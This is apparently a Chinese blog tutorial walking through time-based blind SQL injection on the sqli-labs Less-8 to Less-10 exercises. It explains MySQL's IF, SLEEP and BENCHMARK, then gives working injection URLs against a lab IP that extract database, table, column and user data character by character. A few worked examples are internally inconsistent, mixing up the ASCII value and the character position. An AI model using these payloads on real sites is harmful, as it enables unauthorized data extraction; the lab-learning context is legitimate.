@@ -1,0 +1,112 @@
+写在前面：今天介绍基于时间的盲注。
+
+我们利用延时注入进行，同时id 参数进行的是一定的处理。
+主要使用的函数有if()、sleep()、BENCHMARK()
+
+1.if语句/if()函数
+
+在基于时间型SQL盲注中，我们经常使用条件语句来判断我们的操作是否正确：
+
+if condition then do_something else do_something_else11
+
+即如果某条件发生，那么执行语句一；否则，执行语句二。
+
+在mysql中，if（）函数语法如下：
+
+IF(expr1,expr2,expr3)
+
+如果 expr1 为真，则 IF()函数执行expr2语句; 否则 IF()函数执行expr3语句。
+
+2.sleep()函数
+
+在mysql中，sleep()函数语法如下：
+
+sleep(seconds)
+
+即sleep() 函数代码执行延迟若干秒。
+
+3.BENCHMARK()函数
+
+在mysql中，BENCHMARK()函数语法如下：
+
+BENCHMARK(count,expr)
+
+即BENCHMARK()函数重复执行表达式expr count次。
+
+一般情况下，我们不建议使用BENCHMARK()函数，因为其消耗大量的CPU资源。
+
+参考文章：基于时间型的SQL盲注 http://blog.csdn.net/bear_n/article/details/53057716?locationNum=9&fps=1
+
+这里用sleep()函数。这里因为我们利用的是时间的延迟。
+
+基于的原理是，当对数据库进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0.
+
+例如：
+
+
+于是sleep（N）这个语句在这种情况下起到了非常大的作用。
+
+ Select sleep（N）可以让此语句运行n秒钟。
+
+但是如果查询语句的条件不存在，执行的时间便是0，利用该函数这样一个特殊的性质，可以利用时间延迟来判断我们查询的是否存在。
+
+参考文章：Sql注入系列详解（一）---基于时间差的盲注
+
+http://blog.csdn.net/jinzhichaoshuiping/article/details/45568883
+
+进入正题。
+
+less-8
+
+1.首先select database()查询数据库
+
+ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码
+ascii(substr((select database()),1,1))>64：ascii大于64就返回true，if就返回1，否则返回0
+
+ps: 正确的时候直接返回，不正确的时候等待5 秒钟。
+
+http://43.247.91.228:84/Less-8/?id=1 and If(ascii(substr(database(),1,1))=116,1,sleep(5))--+
+说明第一位是s （ascii 码是115）
+
+http://43.247.91.228:84/Less-8/?id=1 and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+
+说明第一位是e （ascii 码是101）
+
+逐渐爆出数据库名。（这里推荐采用二分法，快速爆出库名）
+
+2.爆表
+
+http://43.247.91.228:84/Less-8/?id=1 and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+
+
+所以第一个数据表的第一位是e...依此爆出emails。
+
+然后爆第二个、第三个表。
+
+3.爆users表的列
+
+http://43.247.91.228:84/Less-8/?id=1 and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+
+
+爆出users表的第一个列的第一个字符是i
+
+逐渐爆出列名 id，username，password
+
+4.爆username列中的数据
+
+http://43.247.91.228:84/Less-8/?id=1 and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+
+
+逐渐爆出信息。
+
+less-8 over！
+
+less-9
+
+按照less-8的payload，id加单引号闭合。
+
+less-9 over！
+
+less-10 
+
+按照less-8的payload，id加双引号闭合。
+
+less-10 over！
+
+ps：又是漫长的写脚本造轮子的过程，深深感受到开发大佬的心情，写bug改bug2333333.....
